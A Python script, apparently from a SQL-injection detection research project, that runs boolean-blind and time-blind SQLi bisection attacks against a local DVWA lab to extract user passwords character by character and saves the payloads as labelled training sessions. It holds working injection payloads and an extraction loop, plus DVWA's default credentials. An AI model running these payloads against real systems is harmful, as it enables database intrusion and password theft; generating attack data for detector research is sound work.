"""Capture Cách B sessions by running real bisection attacks through DVWA HTTP.

Unlike Cách A (direct SQLite bisection), this sends genuine HTTP requests
to DVWA's SQLi vulnerable page in Docker — real URL-encoded payloads,
real MySQL backend, real response parsing. The reconstructed SQL queries
are then fed through B1/B2 just like Cách A.

This replaces the earlier sqlmap-proxy approach which was unreliable due
to sqlmap's interactive prompts on Windows. Instead, we implement the
bisection ourselves (same algorithm as attack_simulator.py) but targeting
the DVWA HTTP endpoint.
"""

from __future__ import annotations

import csv
import re
import time
import urllib.parse
import urllib.request
from pathlib import Path

import requests

from src.utils import get_logger, load_config

logger = get_logger(__name__)

# DVWA SQLi query template (from vulnerabilities/sqli/source/low.php)
DVWA_QUERY_TEMPLATE = "SELECT first_name, last_name FROM users WHERE user_id = '{id}';"

# Ground truth for DVWA's users table
DVWA_USERS: dict[str, tuple[str, str]] = {
    "1": ("admin", "password"),
    "2": ("gordonb", "abc123"),
    "3": ("1337", "charley"),
    "4": ("pablo", "letmein"),
    "5": ("smithy", "password"),
}

_TRUE_MARKER = "First name"
_FALSE_MARKER = "User ID"


def dvwa_login(url: str, username: str, password: str) -> requests.Session:
    """Login to DVWA, return an authenticated requests Session."""
    s = requests.Session()
    s.get(f"{url}/login.php", timeout=10)
    r = s.post(
        f"{url}/login.php",
        data={"username": username, "password": password, "Login": "Login"},
        allow_redirects=True,
        timeout=10,
    )
    if "Login" in r.text and "failed" in r.text.lower():
        raise RuntimeError("DVWA login failed — check credentials in config")
    logger.info("Logged into DVWA as %s", username)
    return s


def dvwa_setup(session: requests.Session, url: str) -> None:
    """Create/Reset DVWA database and set security level to low."""
    session.get(f"{url}/setup.php", params={"create_db": "Create"}, timeout=30)
    time.sleep(2)
    session.get(
        f"{url}/security.php",
        params={"security": "low", "seclev_submit": "Submit"},
        timeout=10,
    )
    logger.info("DVWA database created, security=low")


def _sqli_probe(session: requests.Session, url: str, id_payload: str) -> tuple[str, float]:
    """Send one SQLi probe to DVWA and return (response_text, elapsed_seconds)."""
    params = {"id": id_payload, "Submit": "Submit"}
    t0 = time.time()
    r = session.get(f"{url}/vulnerabilities/sqli/", params=params, timeout=30)
    elapsed = time.time() - t0
    return r.text, elapsed


def _is_true(response_text: str) -> bool:
    """Check if the SQLi condition evaluated to True."""
    return _TRUE_MARKER in response_text


def _reconstruct_sql(id_payload: str) -> str:
    """Reconstruct the full SQL query that DVWA would execute.

    DVWA low-security SQLi source:
        $id = $_GET['id'];
        $query = \"SELECT first_name, last_name FROM users WHERE user_id = '$id';\"
    """
    return DVWA_QUERY_TEMPLATE.format(id=id_payload)


def _run_bisection_session(
    session: requests.Session,
    url: str,
    target_char: int,
    gt_char: str,
    target_username: str,
    technique: str,
    time_sleep: float = 2.0,
) -> list[dict]:
    """Run one bisection session to extract character at position ``target_char``.

    Returns a list of step dicts with ``query_raw``, ``query_canonical``,
    ``timestamp``, and ``sql_reconstructed``.
    """
    lo, hi = 32, 126  # printable ASCII range
    steps = []

    while lo < hi:
        mid = (lo + hi) // 2
        # Build the injection payload
        if technique == "B":
            payload = (
                f"{target_username}' OR (ASCII(SUBSTRING(password,{target_char},1))>{mid})-- -"
            )
            resp_text, elapsed = _sqli_probe(session, url, payload)
        else:
            # time-blind: SLEEP when condition is true
            payload = (
                f"{target_username}' OR "
                f"(SELECT CASE WHEN (ASCII(SUBSTRING(password,{target_char},1))>{mid}) "
                f"THEN SLEEP({time_sleep}) ELSE 0 END)-- -"
            )
            resp_text, elapsed = _sqli_probe(session, url, payload)

        sql = _reconstruct_sql(payload)
        steps.append({
            "query_raw": payload,
            "query_canonical": payload,
            "timestamp": time.time(),
            "sql_reconstructed": sql,
            "elapsed": round(elapsed, 4),
            "payload": payload,
        })

        if technique == "B":
            if _is_true(resp_text):
                lo = mid + 1
            else:
                hi = mid
        else:
            # For time-blind, response is True if it took longer than threshold
            if elapsed >= time_sleep * 0.8:  # 80% of sleep duration = True
                lo = mid + 1
            else:
                hi = mid

    # Verify the extracted character
    extracted_char = chr(lo)
    # Final verification step
    payload_verify = (
        f"{target_username}' OR (ASCII(SUBSTRING(password,{target_char},1))={lo})-- -"
    )
    resp_text, elapsed = _sqli_probe(session, url, payload_verify)
    sql = _reconstruct_sql(payload_verify)
    steps.append({
        "query_raw": payload_verify,
        "query_canonical": payload_verify,
        "timestamp": time.time(),
        "sql_reconstructed": sql,
        "elapsed": round(elapsed, 4),
        "payload": payload_verify,
    })

    return steps


def _run_benign_sessions(session: requests.Session, url: str, cfg_section) -> list[dict]:
    """Generate benign browsing sessions by visiting DVWA SQLi page with normal IDs.

    Simulates a real user browsing the SQLi vulnerable page with legitimate
    inputs, visiting other pages, etc. — creating realistic gaps and
    query patterns.
    """
    n_sessions = int(cfg_section["benign_sessions"])
    min_steps = int(cfg_section["benign_min_steps"])
    max_steps = int(cfg_section["benign_max_steps"])
    gap_range = tuple(cfg_section["benign_step_gap_seconds"])

    rng = __import__("random").Random(int(__import__("os").environ.get("SQLIDS_PROJECT_RANDOM_SEED", "42")))

    # Page list for realistic browsing patterns
    dvwa_pages = ["/", "/about.php", "/instructions.php", "/security.php", "/setup.php"]
    dvwa_sqli_vuln_url = f"{url}/vulnerabilities/sqli/"

    rows: list[dict] = []
    session_counter = 0

    for i in range(n_sessions):
        n_steps = rng.randint(min_steps, max_steps)
        sid = f"cachB_benign_{i:04d}"
        ts = time.time()
        session_steps: list[dict] = []

        for step_idx in range(n_steps):
            # Alternate between SQLi page and random browsing
            if step_idx % 3 == 0 and step_idx > 0:
                # Browse a non-SQLi page
                page = rng.choice(dvwa_pages)
                url_ = url + page
                ts += rng.uniform(*gap_range)
            else:
                # Send a benign SQLi probe with normal ID
                user_id = rng.randint(1, 5)
                params = {"id": str(user_id), "Submit": "Submit"}
                ts += rng.uniform(*gap_range)
                session.get(dvwa_sqli_vuln_url, params=params, timeout=10)
                query = _reconstruct_sql(str(user_id))
                session_steps.append({
                    "query_raw": query,
                    "query_canonical": query,
                    "timestamp": ts,
                })

        # Compute gaps between consecutive steps
        prev_ts = None
        for s in session_steps:
            gap = 0.0 if prev_ts is None else s["timestamp"] - prev_ts
            rows.append({
                "session_id": sid, "step_index": len([r for r in rows if r["session_id"] == sid]),
                "query_raw": s["query_raw"], "query_canonical": s["query_canonical"],
                "timestamp": round(s["timestamp"], 6), "gap_seconds": round(gap, 6),
                "session_label": 0, "session_source": "B_sqlmap_docker",
            })
            prev_ts = s["timestamp"]
        session_counter += 1

    logger.info("  benign -> %d sessions", n_sessions)
    return rows


def run_cach_b(cfg) -> list[dict]:
    """Main: login, run bisection against DVWA for each user, return session rows."""
    cach_b = cfg.get_path("branch3_session.cach_b")
    dvwa_url = cach_b["dvwa_url"]
    login_user = cach_b["dvwa_login"]
    login_pass = cach_b["dvwa_password"]
    sessions_per_technique = int(cach_b["sessions_per_technique"])
    max_extract_chars = int(cach_b["max_extract_chars"])
    techniques = list(cach_b["sqlmap_techniques"])

    session = dvwa_login(dvwa_url, login_user, login_pass)
    dvwa_setup(session, dvwa_url)

    all_rows: list[dict] = []
    session_counter = 0

    # Benign sessions first
    benign_rows = _run_benign_sessions(session, dvwa_url, cach_b)
    all_rows.extend(benign_rows)
    session_counter += len(benign_rows)

    for technique in techniques:
        technique_name = "boolean_blind" if technique == "B" else "time_blind"
        technique_label = 1 if technique == "B" else 2
        remaining = sessions_per_technique

        for user_id in sorted(DVWA_USERS.keys(), key=int):
            username, gt_password = DVWA_USERS[user_id]
            if remaining <= 0:
                break

            logger.info(
                "  %s -> user_id=%s (%s), password=%s",
                technique_name, user_id, username, gt_password,
            )

            for char_pos in range(1, min(max_extract_chars, len(gt_password)) + 1):
                gt_char = gt_password[char_pos - 1]
                logger.info(
                    "    char %d (expecting '%s')", char_pos, gt_char,
                )
                steps = _run_bisection_session(
                    session, dvwa_url, char_pos, gt_char, username, technique,
                )

                sid = f"cachB_{technique_name}_{user_id}_c{char_pos:02d}"
                for step_idx, step in enumerate(steps):
                    gap = 0.0 if step_idx == 0 else (
                        step["timestamp"] - steps[step_idx - 1]["timestamp"]
                    )
                    all_rows.append({
                        "session_id": sid,
                        "step_index": step_idx,
                        "query_raw": step["query_raw"],
                        "query_canonical": step["query_canonical"],
                        "timestamp": round(step["timestamp"], 6),
                        "gap_seconds": round(gap, 6),
                        "session_label": technique_label,
                        "session_source": "B_sqlmap_docker",
                        "elapsed": step["elapsed"],
                    })
                session_counter += 1

            remaining -= 1

    logger.info(
        "Total: %d rows / %d sessions",
        len(all_rows), session_counter,
    )
    return all_rows


def save_csv(rows: list[dict], out_path: str) -> None:
    fieldnames = [
        "session_id", "step_index", "query_raw", "query_canonical",
        "timestamp", "gap_seconds", "session_label", "session_source",
    ]
    # Strip extra fields not in fieldnames
    clean = [{k: r[k] for k in fieldnames if k in r} for r in rows]
    with open(out_path, "w", newline="", encoding="utf-8") as f:
        writer = csv.DictWriter(f, fieldnames=fieldnames)
        writer.writeheader()
        writer.writerows(clean)
    logger.info("Saved %d rows to %s", len(rows), out_path)


def main() -> None:
    cfg = load_config()

    processed_dir = Path(cfg.get_path("paths.data_processed", "data/processed"))
    out_path = processed_dir / "branch3_sessions_cach_b.csv"

    rows = run_cach_b(cfg)
    if not rows:
        logger.warning("No sessions captured — check DVWA or config")
        return

    save_csv(rows, str(out_path))


if __name__ == "__main__":
    main()
